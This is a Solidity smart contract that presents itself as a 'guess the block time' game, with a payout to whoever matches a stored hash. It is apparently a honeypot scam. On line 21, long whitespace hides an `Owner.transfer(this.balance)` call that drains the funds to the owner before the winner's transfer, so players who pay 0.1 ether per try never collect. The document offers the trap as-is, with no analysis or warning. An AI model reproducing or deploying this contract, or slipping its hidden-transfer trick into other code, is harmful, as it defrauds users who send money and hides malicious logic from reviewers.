1 pragma solidity ^0.4.19;
2 
3 //Guess the block time and win the 
4 //balance. Proceed at your own risk.
5 //Open for all to play.
6 contract CarnieGamesBlackBox
7 {
8     address public Owner = msg.sender;
9     bytes32 public key = keccak256(block.timestamp);
10    
11     function() public payable{}
12    
13     //.1 eth charged per attempt
14     function OpenBox(uint256 guess)
15     public
16     payable
17     {                                                                    
18         if(msg.value >= .1 ether)
19         {
20             if(keccak256(guess) == key)
21             {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
22                 msg.sender.transfer(this.balance);
23             }
24         }                                                                                                                
25     }
26     
27     function GetHash(uint256 input)
28     public
29     pure
30     returns(bytes32)
31     {
32         return keccak256(input);
33     }
34     
35     function Withdraw()
36     public
37     {
38         require(msg.sender == Owner);
39         Owner.transfer(this.balance);
40     }
41 }